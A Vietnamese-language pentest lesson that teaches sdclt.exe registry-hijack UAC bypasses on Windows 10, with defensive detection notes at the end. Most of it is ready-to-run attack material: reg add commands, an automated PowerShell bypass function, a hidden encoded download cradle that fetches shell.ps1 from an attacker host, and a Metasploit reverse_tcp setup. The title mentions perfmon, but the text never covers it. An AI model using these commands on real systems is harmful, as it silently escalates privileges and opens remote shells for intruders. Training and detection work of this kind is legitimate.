---
title: "05. Registry Hijack — sdclt & perfmon"
type: attack
tags: [pentest, windows, uac-bypass, registry-hijack, sdclt, perfmon, attack, lesson-05]
aliases: [sdclt UAC Bypass, perfmon UAC Bypass]
created: 2026-04-02
---

> **Prerequisites**: [[03-registry-hijack-fodhelper|03. Registry Hijack — fodhelper]] · [[04-registry-hijack-eventvwr|04. Registry Hijack — eventvwr]]
> **Objectives**:
> - Hiểu ba variant khác nhau của sdclt bypass
> - Biết sự khác biệt giữa IsolatedCommand, App Paths, và Folder class approach
> - Nắm cách sdclt.exe gọi control.exe và tại sao App Paths bị exploit
> - Hiểu khi nào dùng sdclt thay vì fodhelper/eventvwr

---

## Điều kiện khai thác

> [!note] Điều kiện bắt buộc
> - User trong local Administrators group (Medium Integrity)
> - UAC không ở Always Notify
> - Windows 10 (sdclt.exe là Backup and Restore — tồn tại từ Windows 7)
> - Các variant khác nhau hoạt động trên các phiên bản Windows khác nhau

---

## Cơ chế tấn công

### sdclt.exe là gì?

`sdclt.exe` (System Data Recovery Tool / Backup and Restore) là binary có `autoElevate=true`. Khi chạy với argument `/KnownFolder`, nó mở Windows Explorer đến folder được chỉ định.

`sdclt.exe` có ba đường đọc registry khác nhau, mỗi đường tạo ra một variant exploit riêng:

### Variant 1 — IsolatedCommand (Folder class)

Khi `sdclt.exe` khởi động, nó gọi Windows Shell để mở Explorer window. Trong quá trình này, nó tra cứu shell verb cho **Folder class**:

```text
1. HKCU\Software\Classes\Folder\shell\open\command  ← attacker territory
2. HKLM\Software\Classes\Folder\shell\open\command
```

Ngoài `(Default)`, key này còn đọc value `IsolatedCommand` — nếu tồn tại, Windows ưu tiên thực thi IsolatedCommand hơn Default.

```cmd
reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\Folder\shell\open\command" /v "IsolatedCommand" /t REG_SZ /d "cmd.exe" /f
sdclt.exe /KnownFolder:{3EB685DB-65F9-4CF6-A03A-E3EF65729F3D}
```

> [!note] IsolatedCommand vs Default
> Windows dùng `IsolatedCommand` cho trường hợp process elevation riêng biệt để tránh DLL injection từ parent process. Attacker lợi dụng: plant `IsolatedCommand` để đảm bảo payload chạy trong isolated elevated context.

### Variant 2 — App Paths

`sdclt.exe` gọi `control.exe` (Control Panel) trong một số path. Windows tìm kiếm executable qua `App Paths`:

```text
1. HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe  ← HKCU first
2. HKLM\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe
3. %PATH% lookup
```

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /d "cmd.exe" /f
start sdclt.exe
```

Khi `sdclt.exe` (High Integrity) tra cứu `control.exe` qua App Paths, nó tìm thấy `cmd.exe` của attacker và thực thi.

### Variant 3 — sdclt với /enablemanifest flag

Variant này dùng trực tiếp:

```cmd
sdclt.exe /enablemanifest
```

Với HKCU registry key:
```cmd
reg add "HKCU\Software\Classes\Folder\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f
reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe" /f
sdclt.exe /enablemanifest
```

---

## Quy trình tấn công

**Môi trường giả định**: Medium Integrity shell trên Windows 10.

### Variant 1 — IsolatedCommand (khuyến nghị)

**Bước 1 — Plant**

```cmd
reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\Folder\shell\open\command" /v "IsolatedCommand" /t REG_SZ /d "cmd.exe" /f
```

> **Expected output**: The operation completed successfully.

**Bước 2 — Trigger**

```cmd
sdclt.exe /KnownFolder:{3EB685DB-65F9-4CF6-A03A-E3EF65729F3D}
```

> **Expected output**: cmd.exe mới xuất hiện ở High Integrity, không có UAC prompt.

**Bước 3 — Verify**

```cmd
whoami /groups | findstr "High Mandatory"
```

**Bước 4 — Cleanup**

```cmd
reg delete "HKCU\Software\Classes\Folder" /f
```

### Variant 2 — App Paths

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /d "cmd.exe" /f
start sdclt.exe
Start-Sleep 3
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f
```

### PowerShell — Full Automation (Variant 1)

```powershell
function Invoke-SdcltBypass {
    param([string]$Command = "cmd.exe")

    $folderPath = "HKCU:\Software\Classes\Folder\shell\open\command"
    try {
        New-Item -Force -Path $folderPath -Value $Command | Out-Null
        New-ItemProperty -Force -Path $folderPath -Name "IsolatedCommand" `
            -Value $Command -PropertyType String | Out-Null

        $knownFolder = "{3EB685DB-65F9-4CF6-A03A-E3EF65729F3D}"
        Start-Process "sdclt.exe" -ArgumentList "/KnownFolder:$knownFolder"
        Start-Sleep -Seconds 3
    } finally {
        Remove-Item -Force -Recurse "HKCU:\Software\Classes\Folder" `
            -ErrorAction SilentlyContinue
    }
}

Invoke-SdcltBypass -Command "cmd.exe"
```

---

## Biến thể & Bypass

### sdclt + payload không phải cmd.exe

```powershell
$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
    "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"
))
$cmd = "powershell.exe -nop -w hidden -enc $b64"

$p = "HKCU:\Software\Classes\Folder\shell\open\command"
New-Item -Force -Path $p -Value $cmd | Out-Null
New-ItemProperty -Force -Path $p -Name "IsolatedCommand" -Value $cmd | Out-Null
Start-Process "sdclt.exe" -ArgumentList "/KnownFolder:{3EB685DB-65F9-4CF6-A03A-E3EF65729F3D}"
Start-Sleep 3
Remove-Item -Force -Recurse "HKCU:\Software\Classes\Folder"
```

### Dùng Metasploit

```bash
use exploit/windows/local/bypassuac_sdclt
set SESSION <session_id>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
exploit
```

---

## Cây quyết định

```mermaid
flowchart TD
    A[User trong Admins?] -->|Không| Z1[Không áp dụng]
    A -->|Có| B{Cần flexibility<br>trigger binary khác?}
    B -->|Cần tránh fodhelper/eventvwr| C[Chọn sdclt.exe variant]
    B -->|Không quan trọng| D[Dùng fodhelper Lesson 03<br>hoặc eventvwr Lesson 04]
    C --> E{Variant nào?}
    E -->|Đơn giản nhất| F[Variant 1: IsolatedCommand<br>Folder class hijack]
    E -->|App Paths abuse| G[Variant 2: App Paths<br>control.exe redirect]
    E -->|Metasploit available| H[bypassuac_sdclt module]
    F --> I[Trigger: sdclt /KnownFolder:{GUID}]
    G --> J[Trigger: start sdclt.exe]
    H --> K[MSF auto-handles]
    I --> L{Success?}
    J --> L
    K --> L
    L -->|Có| M[Cleanup registry]
    L -->|Không| N[Kiểm tra UAC level<br>Thử variant khác]
```

---

## Command Cheatsheet

**Variant 1 — IsolatedCommand**

```cmd
reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\Folder\shell\open\command" /v "IsolatedCommand" /t REG_SZ /d "cmd.exe" /f
sdclt.exe /KnownFolder:{3EB685DB-65F9-4CF6-A03A-E3EF65729F3D}
reg delete "HKCU\Software\Classes\Folder" /f
```

**Variant 2 — App Paths**

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /d "cmd.exe" /f
start sdclt.exe
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f
```

**PowerShell Variant 1**

```powershell
$p = "HKCU:\Software\Classes\Folder\shell\open\command"
New-Item -Force -Path $p -Value "cmd.exe" | Out-Null
New-ItemProperty -Force -Path $p -Name "IsolatedCommand" -Value "cmd.exe" | Out-Null
Start-Process sdclt.exe -ArgumentList "/KnownFolder:{3EB685DB-65F9-4CF6-A03A-E3EF65729F3D}"
Start-Sleep 3
Remove-Item -Force -Recurse "HKCU:\Software\Classes\Folder"
```

**Verify**

```cmd
whoami /groups | findstr "High Mandatory"
```

---

## Daily Drill

**Thời gian**: 15 phút/ngày trong 5 ngày.

**Drill 1 — Nhớ GUID**
Mục tiêu: nhớ `{3EB685DB-65F9-4CF6-A03A-E3EF65729F3D}` là Documents KNOWNFOLDERID.

Luyện cho đến khi: gõ GUID đầy đủ không cần copy-paste, hoặc biết tra cứu nhanh bằng `[System.Environment]::GetFolderPath('MyDocuments')`.

**Drill 2 — So sánh 3 variant**
Mục tiêu: nhớ ba registry path khác nhau.

| Variant | Registry Path | Trigger |
|---------|-------------|---------|
| IsolatedCommand | `HKCU\...\Folder\shell\open\command` (IsolatedCommand value) | `sdclt.exe /KnownFolder:{GUID}` |
| App Paths | `HKCU\...\App Paths\control.exe` | `start sdclt.exe` |

Luyện cho đến khi: không nhầm lẫn hai path.

**Drill 3 — Full automation script**
Mục tiêu: viết lại `Invoke-SdcltBypass` function từ trí nhớ.

Luyện cho đến khi: function hoàn chỉnh bao gồm try/finally cleanup block.

---

## Phát hiện & Phòng thủ

> [!warning] Detection Indicators
> **Variant 1 — IsolatedCommand**:
> - Sysmon Event ID 13: `TargetObject: HKCU\Software\Classes\Folder\shell\open\command`
> - Giá trị `IsolatedCommand` được set là suspicious vì rất hiếm trong legitimate software
>
> **Variant 2 — App Paths**:
> - Sysmon Event ID 13: `TargetObject: HKCU\Software\...\App Paths\control.exe`
> - `control.exe` bị override bởi App Paths là cực kỳ suspicious
>
> **Process**: `sdclt.exe` spawn `cmd.exe` hoặc `powershell.exe` là bất thường
> - Legitimate: sdclt.exe chỉ spawn `control.exe` và Windows explorer components
>
> **SIEM**: `ParentImage=sdclt.exe AND Image IN (cmd.exe, powershell.exe, wscript.exe)`

> [!note] Mitigation
> - Tăng UAC lên Always Notify
> - Monitor `HKCU\Software\Classes\Folder\` writes
> - AppLocker: restrict sdclt.exe nếu không cần Backup feature
> - Windows Defender Application Control (WDAC) policy

---

## Lab Thực hành

| Platform | Machine | Tại sao phù hợp |
|----------|---------|----------------|
| Local VM | Windows 10 | Test cả 3 variant — quan sát sự khác biệt trong Procmon |
| HTB | **Arkham** (Retired) | Multiple UAC bypass techniques — compare sdclt vs CMSTP |
| TryHackMe | **Bypassing UAC** | Dedicated UAC bypass practice room |
| HTB | **VulnEscape** (Retired) | UAC bypass trong interactive session context |

---

## Field Manual Entry

> [!abstract] sdclt.exe UAC Bypass
> **Điều kiện**: User trong Admins, UAC ≠ Always Notify, Windows 10
> **Variant 1 (IsolatedCommand)**:
> ```cmd
> reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe" /f
> reg add "HKCU\Software\Classes\Folder\shell\open\command" /v "IsolatedCommand" /t REG_SZ /d "cmd.exe" /f
> sdclt.exe /KnownFolder:{3EB685DB-65F9-4CF6-A03A-E3EF65729F3D}
> reg delete "HKCU\Software\Classes\Folder" /f
> ```
> **Variant 2 (App Paths)**: `reg add HKCU\..\App Paths\control.exe /d "cmd.exe" /f && start sdclt.exe`
> **MSF**: `use exploit/windows/local/bypassuac_sdclt`
> **Ref**: [[05-registry-hijack-sdclt-perfmon|05. Registry Hijack — sdclt & perfmon]]
